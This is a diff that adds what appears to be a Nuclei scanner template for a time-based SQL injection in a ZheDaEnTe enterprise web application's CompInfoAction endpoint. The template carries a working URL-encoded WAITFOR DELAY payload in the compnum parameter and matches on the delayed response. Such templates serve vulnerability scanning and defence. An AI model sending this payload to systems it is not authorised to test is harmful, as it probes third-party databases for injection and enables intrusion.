@@ -1,0 +1,30 @@
+id: ZheDaEnTe-CompInfoAction-SQLInjection
+
+info:
+  name: ZheDaEnTe-CompInfoAction-SQLInjection
+  author: iSee857
+  severity: high
+  description: |
+    ZheDaEnTe-CompInfoAction-SQLInjection
+
+http:
+  - raw:
+      - |
+        GET /entsoft/CompInfoAction.emrser;.js?compnum=1%27%3BWAITFOR+DELAY+%270%3A0%3A3%27--&method=selectCompBank HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 3"
+
+      - type: word
+        part: body
+        words:
+          - date
+        condition: and
+
+      - type: status
+        status:
+          - 200
